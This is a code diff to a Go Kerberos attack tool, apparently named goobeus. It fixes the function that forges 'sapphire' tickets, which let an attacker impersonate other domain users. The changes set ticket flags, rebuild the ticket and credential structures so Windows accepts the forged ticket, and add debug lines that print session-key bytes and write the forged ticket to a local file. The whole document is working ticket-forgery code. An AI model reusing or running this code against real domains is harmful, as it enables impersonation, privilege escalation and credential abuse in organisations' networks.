@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/asn1"
 	"fmt"
+	"os"
 	"time"
 
 	"github.com/goobeus/goobeus/pkg/asn1krb5"
@@ -258,10 +259,25 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 						StartTime: time.Now().UTC(),
 						EndTime:   time.Now().UTC().Add(10 * time.Hour),
 						RenewTill: time.Now().UTC().Add(7 * 24 * time.Hour),
+						// Flags: forwardable, renewable, pre-authent
+						Flags: asn1.BitString{
+							Bytes:     []byte{0x40, 0xe1, 0x00, 0x00}, // 0x40e10000
+							BitLength: 32,
+						},
 					},
 				},
 			},
 		}
+
+		// CRITICAL: Populate Ticket struct fields (they're empty, only RawBytes is set)
+		// This is needed for rebuildTGTFromRawBytes to copy the correct values
+		tgt.Cred.Tickets[0].TktVno = 5
+		tgt.Cred.Tickets[0].Realm = nativeResult.CRealm
+		tgt.Cred.Tickets[0].SName = asn1krb5.PrincipalName{
+			NameType:   asn1krb5.NTSrvInst,
+			NameString: []string{"krbtgt", nativeResult.CRealm},
+		}
+		tgt.Cred.Tickets[0].EncPart.EType = nativeResult.SessionKey.KeyType
 		sessionKey = nativeResult.SessionKey.KeyValue
 		fmt.Printf("[DEBUG] Native AS got session key: etype=%d, len=%d, first8=%x\n",
 			nativeResult.SessionKey.KeyType, len(sessionKey), sessionKey[:min(8, len(sessionKey))])
@@ -404,6 +420,25 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			NameType:   asn1krb5.NTPrincipal,
 			NameString: []string{req.Impersonate},
 		}
+		// Debug: show what's in CredInfo
+		info := &newTGT.CredInfo.TicketInfo[0]
+		fmt.Printf("[DEBUG] CredInfo contents:\n")
+		fmt.Printf("  Key etype=%d, len=%d\n", info.Key.KeyType, len(info.Key.KeyValue))
+		fmt.Printf("  PRealm=%s, PName=%v\n", info.PRealm, info.PName.NameString)
+		fmt.Printf("  SRealm=%s, SName=%v\n", info.SRealm, info.SName.NameString)
+	} else {
+		fmt.Println("[DEBUG] WARNING: CredInfo is nil or empty")
+	}
+
+	// Debug: dump marshaled kirbi bytes
+	kirbiBytes, err := newTGT.Marshal()
+	if err != nil {
+		fmt.Printf("[DEBUG] Marshal error: %v\n", err)
+	} else {
+		fmt.Printf("[DEBUG] Kirbi bytes: %d bytes, first 20: %x\n", len(kirbiBytes), kirbiBytes[:min(20, len(kirbiBytes))])
+		// Dump to file for analysis
+		os.WriteFile("goobeus_kirbi_debug.bin", kirbiBytes, 0600)
+		fmt.Println("[DEBUG] Dumped kirbi to goobeus_kirbi_debug.bin")
 	}
 
 	b64, _ := newTGT.ToBase64()
@@ -988,12 +1023,28 @@ func rebuildTGTFromRawBytes(originalTGT *ticket.Kirbi, encTicketPartBytes []byte
 
 	// Create new Kirbi with updated ticket
 	newKirbi := *originalTGT
+	// CRITICAL: Clear RawBytes so Marshal() uses struct fields instead
+	newKirbi.RawBytes = nil
+
 	if newKirbi.Cred != nil {
 		newCred := *newKirbi.Cred
 		newCred.Tickets = make([]asn1krb5.Ticket, 1)
+
+		// CRITICAL: Copy all fields from original ticket, then update enc-part
+		origTicket := originalTGT.Cred.Tickets[0]
+		newCred.Tickets[0].TktVno = origTicket.TktVno
+		newCred.Tickets[0].Realm = origTicket.Realm
+		newCred.Tickets[0].SName = origTicket.SName
 		newCred.Tickets[0].RawBytes = newTicketBytes
-		newCred.Tickets[0].EncPart.Cipher = encrypted
 		newCred.Tickets[0].EncPart.EType = etype
+		newCred.Tickets[0].EncPart.Cipher = encrypted
+		newCred.Tickets[0].EncPart.Kvno = origTicket.EncPart.Kvno
+
+		// CRITICAL: Clear the KRB-CRED EncPart cipher so Marshal() rebuilds from CredInfo
+		// This ensures Windows gets a valid KRB-CRED structure with the session key
+		newCred.EncPart.Cipher = nil
+		newCred.EncPart.EType = 0
+
 		newKirbi.Cred = &newCred
 	}
 
